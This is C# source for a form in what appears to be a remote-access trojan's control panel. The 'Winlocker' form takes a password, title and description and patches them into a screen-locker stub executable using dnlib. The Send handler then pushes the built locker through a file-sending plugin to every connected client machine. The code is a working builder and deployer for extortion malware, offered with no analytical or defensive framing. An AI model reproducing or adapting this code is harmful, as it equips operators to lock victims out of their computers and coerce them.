using System;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Leb128;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormWinlocker : FormMaterial
{
	public Clients[] clients;

	private IContainer components;

	private Panel panel1;

	private RJTextBox rjTextBox1;

	private RJTextBox rjTextBox2;

	private RJTextBox rjTextBox3;

	private RJButton rjButton5;

	private RJButton rjButton1;

	public FormWinlocker()
	{
		InitializeComponent();
	}

	private void FormWinlocker_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
	}

	private void ChangeScheme(object sender)
	{
		rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox2.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox3.BorderColor = FormMaterial.PrimaryColor;
		rjButton1.BackColor = FormMaterial.PrimaryColor;
		rjButton5.BackColor = FormMaterial.PrimaryColor;
	}

	private void rjButton5_Click(object sender, EventArgs e)
	{
		string text = "Stub\\WinlockerBulid.exe";
		using (ModuleDefMD moduleDefMD = ModuleDefMD.Load("Stub\\Winlocker.exe"))
		{
			foreach (TypeDef type in moduleDefMD.Types)
			{
				foreach (MethodDef method in type.Methods)
				{
					if (method.Body == null)
					{
						continue;
					}
					for (int i = 0; i < method.Body.Instructions.Count(); i++)
					{
						if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
						{
							if ((string)method.Body.Instructions[i].Operand == "%Password%")
							{
								method.Body.Instructions[i].Operand = rjTextBox1.Texts;
							}
							if ((string)method.Body.Instructions[i].Operand == "%Title%")
							{
								method.Body.Instructions[i].Operand = rjTextBox2.Texts;
							}
							if ((string)method.Body.Instructions[i].Operand == "%Description%")
							{
								method.Body.Instructions[i].Operand = rjTextBox3.Texts;
							}
						}
					}
				}
			}
			moduleDefMD.Write(text);
			moduleDefMD.Dispose();
		}
		string checksum = Methods.GetChecksum(text);
		byte[] pack = LEB128.Write(new object[3] { "SendDiskGet", text, checksum });
		string checksum2 = Methods.GetChecksum("Plugin\\SendFile.dll");
		Clients[] array = this.clients;
		foreach (Clients clients in array)
		{
			Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum2, pack });
			});
		}
		Close();
	}

	private void rjButton1_Click(object sender, EventArgs e)
	{
		Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.panel1 = new System.Windows.Forms.Panel();
		this.rjTextBox1 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox2 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox3 = new CustomControls.RJControls.RJTextBox();
		this.rjButton5 = new CustomControls.RJControls.RJButton();
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Controls.Add(this.rjButton1);
		this.panel1.Controls.Add(this.rjButton5);
		this.panel1.Controls.Add(this.rjTextBox3);
		this.panel1.Controls.Add(this.rjTextBox2);
		this.panel1.Controls.Add(this.rjTextBox1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(624, 383);
		this.panel1.TabIndex = 0;
		this.rjTextBox1.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox1.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox1.BorderRadius = 0;
		this.rjTextBox1.BorderSize = 1;
		this.rjTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox1.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox1.Location = new System.Drawing.Point(4, 4);
		this.rjTextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox1.Multiline = false;
		this.rjTextBox1.Name = "rjTextBox1";
		this.rjTextBox1.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox1.PasswordChar = false;
		this.rjTextBox1.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox1.PlaceholderText = "Password";
		this.rjTextBox1.Size = new System.Drawing.Size(240, 31);
		this.rjTextBox1.TabIndex = 33;
		this.rjTextBox1.Texts = "";
		this.rjTextBox1.UnderlinedStyle = false;
		this.rjTextBox2.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox2.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox2.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox2.BorderRadius = 0;
		this.rjTextBox2.BorderSize = 1;
		this.rjTextBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox2.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox2.Location = new System.Drawing.Point(252, 4);
		this.rjTextBox2.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox2.Multiline = false;
		this.rjTextBox2.Name = "rjTextBox2";
		this.rjTextBox2.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox2.PasswordChar = false;
		this.rjTextBox2.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox2.PlaceholderText = "Title";
		this.rjTextBox2.Size = new System.Drawing.Size(368, 31);
		this.rjTextBox2.TabIndex = 34;
		this.rjTextBox2.Texts = "";
		this.rjTextBox2.UnderlinedStyle = false;
		this.rjTextBox3.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox3.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox3.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox3.BorderRadius = 0;
		this.rjTextBox3.BorderSize = 1;
		this.rjTextBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox3.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox3.Location = new System.Drawing.Point(4, 43);
		this.rjTextBox3.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox3.Multiline = true;
		this.rjTextBox3.Name = "rjTextBox3";
		this.rjTextBox3.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox3.PasswordChar = false;
		this.rjTextBox3.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox3.PlaceholderText = "Description";
		this.rjTextBox3.Size = new System.Drawing.Size(616, 290);
		this.rjTextBox3.TabIndex = 35;
		this.rjTextBox3.Texts = "";
		this.rjTextBox3.UnderlinedStyle = false;
		this.rjButton5.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton5.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton5.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton5.BorderRadius = 0;
		this.rjButton5.BorderSize = 0;
		this.rjButton5.FlatAppearance.BorderSize = 0;
		this.rjButton5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton5.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton5.ForeColor = System.Drawing.Color.White;
		this.rjButton5.Location = new System.Drawing.Point(527, 340);
		this.rjButton5.Name = "rjButton5";
		this.rjButton5.Size = new System.Drawing.Size(93, 31);
		this.rjButton5.TabIndex = 47;
		this.rjButton5.Text = "Send";
		this.rjButton5.TextColor = System.Drawing.Color.White;
		this.rjButton5.UseVisualStyleBackColor = false;
		this.rjButton5.Click += new System.EventHandler(rjButton5_Click);
		this.rjButton1.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 0;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton1.ForeColor = System.Drawing.Color.White;
		this.rjButton1.Location = new System.Drawing.Point(428, 340);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(93, 31);
		this.rjButton1.TabIndex = 48;
		this.rjButton1.Text = "Cancel";
		this.rjButton1.TextColor = System.Drawing.Color.White;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(630, 450);
		base.Controls.Add(this.panel1);
		base.Name = "FormWinlocker";
		this.Text = "Winlocker";
		base.Load += new System.EventHandler(FormWinlocker_Load);
		this.panel1.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
